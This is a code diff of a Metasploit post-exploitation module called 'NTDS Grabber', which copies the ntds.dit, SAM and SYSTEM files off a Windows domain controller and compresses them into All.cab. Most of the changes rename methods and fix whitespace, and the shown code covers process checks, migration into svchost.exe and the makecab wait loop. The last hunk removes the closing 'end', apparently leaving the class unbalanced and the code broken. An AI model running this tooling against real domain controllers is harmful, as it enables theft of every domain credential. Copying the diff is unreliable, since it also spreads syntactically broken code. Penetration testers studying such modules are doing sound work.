@@ -10,7 +10,7 @@ class MetasploitModule < Msf::Post
     def initialize(info={})
         super(update_info(info,
           'Name'          => 'NTDS Grabber',
-          'Description'   => %q{This module uses a powershell script to obtain a copy of the ntds,dit SAM and SYSTEM files on a domain controller. It compresses all these files in a cabinet file called All.cab.},
+          'Description'   => %q{This module uses a powershell script to obtain a copy of the ntds,dit SAM and SYSTEM files on a domain controller. It compresses     all these files in a cabinet file called All.cab.},
           'License'       => MSF_LICENSE,
           'Author'        => ['Koen Riepe (koen.riepe@fox-it.com)'],
           'References'    => [''],
@@ -37,7 +37,7 @@ class MetasploitModule < Msf::Post
         return is_dc_srv
     end
 
-    def taskRunning(task)
+    def task_running(task)
         session.shell_write("tasklist \n")
         tasklist = session.shell_read(-1,10).split("\n")
         tasklist.each do |prog|
@@ -49,7 +49,7 @@ class MetasploitModule < Msf::Post
         return false
     end
 
-    def Is32BitOn64Bits()
+    def is_32_bit_on_64_bits()
         apicall = session.railgun.kernel32.IsWow64Process(-1,4)["Wow64Process"]
         if apicall == "\x00\x00\x00\x00"
             migrate = false
@@ -59,7 +59,7 @@ class MetasploitModule < Msf::Post
         return migrate
     end
 
-    def GetWindowsLoc()
+    def get_windows_loc()
         apicall = session.railgun.kernel32.GetEnvironmentVariableA("Windir",255,255)["lpBuffer"]
         windir = apicall.split(":")[0]
         return windir
@@ -90,9 +90,9 @@ class MetasploitModule < Msf::Post
             return
         end
 
-        if Is32BitOn64Bits()
+        if is_32_bit_on_64_bits()
             print_error("The meterpreter is not the same architecture as the OS! Migrating to process matching architecture!")
-            windir = GetWindowsLoc()
+            windir = get_windows_loc()
             newproc = windir + ':\windows\sysnative\svchost.exe'
             if exist?(newproc)
                 print_status("Starting new x64 process #{newproc}")
@@ -106,7 +106,7 @@ class MetasploitModule < Msf::Post
                     print_error("Migration failed!")
                 end
             end
-        else 
+        else
             print_good("The meterpreter is the same architecture as the OS!")
         end
 
@@ -116,11 +116,11 @@ class MetasploitModule < Msf::Post
         cabcount = 0
 
         while cabcount < 2
-            if taskRunning("makecab.exe")
+            if task_running("makecab.exe")
                 cabcount += 1
                 while cabcount < 2
                     print_status("Creating All.cab")
-                    if not taskRunning("makecab.exe")
+                    if not task_running("makecab.exe")
                         cabcount += 1
                         while not file_exist?("All.cab")
                             sleep(1)
@@ -146,4 +146,3 @@ class MetasploitModule < Msf::Post
             print_good("All.cab Removed")
         end
     end
-end
